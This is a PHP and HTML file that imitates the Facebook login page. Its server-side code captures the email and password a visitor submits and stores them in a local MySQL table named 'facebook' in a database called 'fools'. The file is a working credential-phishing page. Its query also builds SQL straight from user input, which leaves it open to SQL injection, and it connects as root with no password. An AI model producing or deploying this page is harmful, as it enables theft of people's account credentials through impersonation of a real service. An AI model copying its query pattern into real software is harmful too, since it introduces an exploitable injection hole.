<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
$email = $_POST['email'];
$pass_wd = $_POST['pass'];
$host = 'localhost';
$name = 'root';
$pass = '';
$db = 'fools';
$mysql = new mysqli($host, $name, $pass, $db);
$mysql->query("INSERT INTO facebook (ID, Pass) VALUES ('$email','$pass_wd')");
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form action="index.php" method="post">
          <input type="text" placeholder="Email or phone number" name="email" required>
          <input type="password" placeholder="Password" name="pass" required>
          <div class="link">
            <button type="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>
